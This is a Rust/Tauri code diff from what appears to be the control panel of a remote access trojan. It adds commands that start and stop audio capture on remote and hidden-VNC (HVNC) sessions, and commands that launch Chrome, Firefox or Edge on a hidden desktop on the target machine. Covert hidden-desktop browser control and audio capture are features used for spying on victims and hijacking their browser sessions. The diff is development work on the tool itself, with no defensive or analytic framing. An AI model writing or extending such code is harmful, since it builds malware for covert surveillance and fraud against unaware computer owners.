@@ -398,6 +398,38 @@ pub async fn stop_remote_desktop(
 }
 
 #[tauri::command]
+pub async fn start_remote_desktop_audio(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartRemoteDesktopAudio(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Remote desktop audio started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_remote_desktop_audio(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopRemoteDesktopAudio(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Remote desktop audio stopped".to_string())
+}
+
+#[tauri::command]
 pub async fn request_mic_devices(
     addr: &str,
     tauri_state: State<'_, SharedTauriState>,
@@ -1291,9 +1323,65 @@ pub async fn manage_hvnc(
             )
             .await?
         }
+        "open_chrome" => {
+            send_server_command(
+                ServerCommand::OpenHVNCProcess(addr.parse().unwrap(), "chrome.exe".to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "open_firefox" => {
+            send_server_command(
+                ServerCommand::OpenHVNCProcess(addr.parse().unwrap(), "firefox.exe".to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "open_edge" => {
+            send_server_command(
+                ServerCommand::OpenHVNCProcess(addr.parse().unwrap(), "msedge.exe".to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
         _ => {}
     }
     Ok("HVNC command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn start_hvnc_audio(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartHVNCFrameAudio(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("HVNC audio started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_hvnc_audio(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopHVNCFrameAudio(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("HVNC audio stopped".to_string())
 }
 
 #[tauri::command]
